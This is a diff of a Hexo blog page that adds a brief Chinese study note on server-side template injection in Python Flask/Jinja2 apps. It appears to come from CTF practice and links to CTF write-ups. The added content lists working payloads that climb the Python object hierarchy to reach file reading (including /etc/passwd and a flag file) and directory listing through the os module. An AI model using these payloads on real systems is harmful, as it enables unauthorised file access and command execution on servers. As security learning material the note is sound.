@@ -5,12 +5,12 @@
     <meta charset="UTF-8" />
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
     <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>11 title - Hexo</title>
+    <title>SSTI - Hexo</title>
     <meta name="apple-mobile-web-app-capable" content="yes" />
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
     <meta name="google" content="notranslate" />
     <meta name="keywords" content="Fechin,"> 
-    
+    <meta name="description" content="SSTI 模板注入漏洞文件包含：是通过python的对象的继承来一步步实现文件读取和命令执行的的。思路：找到父类&amp;lt;type ‘object’&amp;gt;–&amp;gt;寻找子类–&amp;gt;找关于命令执行或,"> 
     <meta name="author" content="John Doe"> 
     <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
     <link rel="icon" href="/img/85E0B2FE93C1D59651632D67AC59568B.png"> 
@@ -30,7 +30,7 @@
     <div class="bar" style="width: 0;"></div>
     <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://example.com"></a>
     <div title="播放/暂停" class="iconfont icon-play"></div>
-    <h3 class="subtitle">11 title</h3>
+    <h3 class="subtitle">SSTI</h3>
     <div class="social">
         <div>
             <div class="share">
@@ -45,14 +45,37 @@
     <div class="section">
         <div class="article">
     <div class='main'>
-        <h1 class="title">11 title</h1>
+        <h1 class="title">SSTI</h1>
         <div class="stuff">
             <span>十二月 14, 2021</span>
             
+  <ul class="post-tags-list" itemprop="keywords"><li class="post-tags-list-item"><a class="post-tags-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li></ul>
+
 
         </div>
         <div class="content markdown">
-            
+            <h1 id="SSTI-模板注入漏洞"><a href="#SSTI-模板注入漏洞" class="headerlink" title="SSTI 模板注入漏洞"></a>SSTI 模板注入漏洞</h1><p>文件包含：是通过python的对象的继承来一步步实现文件读取和命令执行的的。<br>思路：找到父类&lt;type ‘object’&gt;–&gt;寻找子类–&gt;找关于命令执行或者文件操作的模块。</p>
+<p>1.获取基类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__</span><br><span class="line">&#x27;&#x27;.__class__.__mro__[2]</span><br><span class="line">().__class__.__base__</span><br><span class="line">&#123;&#125;.__class__.__base__</span><br><span class="line">request.__class__.__mro__[8] 　　//针对jinjia2/flask为[9]适用</span><br><span class="line">或者</span><br><span class="line">[].__class__.__bases__[0]       //其他的类似</span><br></pre></td></tr></table></figure>
+
+<p>2.获取本类的子类</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()</span><br></pre></td></tr></table></figure>
+
+<p>3.找到可利用的方法</p>
+<p>&lt;type ‘file’&gt;等    &lt;class ‘site._Printer’&gt;类型（可以进行命令执行）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[40](&#x27;/etc/passwd&#x27;).read()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].listdir(&#x27;.&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>找到目标文件，接着读取文件</p>
+<p>4.读写文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__mro__[2].__subclasses__()[40](&#x27;fl4g&#x27;).read()&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>有四种方法，具体详情参考第二篇文章</p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cioi/p/12308518.html#a5">从零开始的ssti学习（已填） - Cxlover - 博客园 (cnblogs.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Onlyone_1314/article/details/121569766">(40条消息) XCTF-攻防世界CTF平台-Web类——12、Web_python_template_injection（SSTI服务器模板注入、Flask框架之Jinja2模板渲染引擎）_Onlyone_1314的博客-CSDN博客</a></p>
+
             <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
             <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
                 <source type="audio/mpeg" src="">
